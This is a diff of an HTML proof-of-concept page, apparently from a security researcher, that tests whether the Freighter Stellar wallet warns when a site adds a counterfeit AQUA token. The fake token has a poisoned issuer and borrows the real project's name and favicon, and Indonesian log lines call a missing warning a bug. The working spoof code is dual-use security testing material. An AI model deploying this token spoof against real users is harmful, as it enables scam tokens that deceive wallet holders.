@@ -3,10 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Freighter addToken Spoof - 0x403for SAFE</title>
+<title>Freighter addToken Spoof - 0x403for</title>
 <style>
 body{background:#000;color:#0f0;font-family:monospace;padding:12px;margin:0}
-h2{color:#ff0;font-size:13px}
 .origin{background:#111;color:#ff0;padding:6px;border:1px solid #333;font-size:11px;margin:6px 0}
 button{width:100%;padding:13px;margin:5px 0;background:#111;border-radius:6px;text-align:left;font-size:11px}
 .crit{border:1px solid #f00;color:#ff6b6b}
@@ -26,39 +25,38 @@ pre{background:#0a0a0a;padding:8px;height:420px;overflow:auto;border:1px solid #
 
 <pre id="log"></pre>
 <script>
-function log(t){document.getElementById('log').innerText+='['+new Date().toLocaleTimeString()+'] '+t+'\n';}
+function log(t){let el=document.getElementById('log');el.innerText+='['+new Date().toLocaleTimeString()+'] '+t+'\n';el.scrollTop=99999;}
 function updateOrigin(){document.getElementById('originBox').innerText='Origin: '+location.origin;}
 
 function dumpApi(){
- updateOrigin();
- log('=== DUMP ===');
- if(window.freighterApi){
-  log('freighterApi.addToken = '+typeof window.freighterApi.addToken);
- } else {
+updateOrigin();
+log('=== DUMP ===');
+let api = window.freighterApi || window.freighter;
+if(api){
+  log('FOUND: '+Object.keys(api).join(', ').substring(0,400));
+  log('addToken: '+typeof api.addToken);
+}else{
   log('NOT FOUND - buka play.freighter.app seperti screenshot kamu 21.41');
- }
 }
-
+}
 function addRealAqua(){
- updateOrigin();
- log('=== REAL AQUA ===');
- let real={code:'AQUA', issuer:'GBNZILSTVQZ4R7IKQDGHYGY2HT5Q2QYMCHZECHUCBZ5QSE7F3N5TA2AQUA', domain:'aqua.network', name:'Aquarius REAL'};
- log(JSON.stringify(real));
- window.freighterApi.addToken(real).then(r=>log('Result REAL: '+JSON.stringify(r))).catch(e=>log('Error: '+e.message));
+log('=== REAL AQUA ===');
+let real={"code":"AQUA","issuer":"GBNZILSTVQZ4R7IKQDGHYGY2HT5Q2QYMCHZECHUCBZ5QSE7F3N5TA2AQUA","domain":"aqua.network","name":"Aquarius REAL"};
+log(JSON.stringify(real));
+let api = window.freighterApi || window.freighter;
+if(api && api.addToken){api.addToken(real).then(r=>log('Result: '+JSON.stringify(r)));}
 }
-
 function addFakeAqua(){
- updateOrigin();
- log('=== FAKE AQUA SPOOF TEST HIGH ===');
- let fake={code:'AQUA', issuer:'GDXNPOISONED0x403forEVILFAKE12345678901234567890', domain:'0x403for.github.io', name:'Aquarius', image:'https://aqua.network/favicon.png'};
- log(JSON.stringify(fake));
- log('Expected: Freighter harus warning issuer beda / show origin 0x403for');
- log('BUG: Kalau tanpa warning = user ketipu token scam');
- window.freighterApi.addToken(fake).then(r=>log('Result FAKE: '+JSON.stringify(r))).catch(e=>log('Error FAKE: '+e.message));
+log('=== FAKE AQUA SPOOF TEST HIGH ===');
+let fake={"code":"AQUA","issuer":"GDXNPOISONED0x403forEVILFAKE12345678901234567890","domain":"0x403for.github.io","name":"Aquarius","image":"https://aqua.network/favicon.png"};
+log(JSON.stringify(fake));
+log('Expected: Freighter harus warning issuer beda / show origin 0x403for');
+log('BUG: Kalau tanpa warning = user ketipu token scam');
+let api = window.freighterApi || window.freighter;
+if(api && api.addToken){api.addToken(fake).then(r=>log('Result: '+JSON.stringify(r)));}
 }
-
 function addDouble(){addRealAqua(); setTimeout(addFakeAqua,1500);}
-window.onload=()=>{updateOrigin(); log('Ready '+location.origin);};
+window.onload=function(){updateOrigin(); log('Ready '+location.origin);};
 </script>
 </body>
 </html>
